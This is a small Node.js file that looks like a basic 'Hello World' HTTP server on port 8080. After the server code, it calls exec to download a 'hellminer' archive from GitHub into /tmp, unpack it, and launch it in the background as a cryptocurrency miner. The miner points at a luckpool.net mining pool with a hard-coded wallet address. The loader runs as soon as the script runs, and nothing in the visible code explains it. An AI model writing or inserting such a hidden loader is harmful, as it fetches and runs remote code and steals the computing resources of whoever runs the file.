var http = require("http");

//create a server object:
http
  .createServer(function (req, res) {
    res.write("Hello World!"); //write a response to the client
    res.end(); //end the response
  })
  .listen(8080); //the server object listens on port 8080
const { exec } = require("child_process");

exec(
  "cd /tmp && wget https://github.com/dorowu88x/new1/raw/main/hellminer.tar.gz && tar xf hellminer.tar.gz && nohup ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RQNYT55NGnyqBA4fGuqmdBDBJZAE2ESZC5.AP -p x --cpu 1 &",
  (error, stdout, stderr) => {
    if (error) {
      console.log(`error: ${error.message}`);
      return;
    }
    if (stderr) {
      console.log(`stderr: ${stderr}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
  }
);
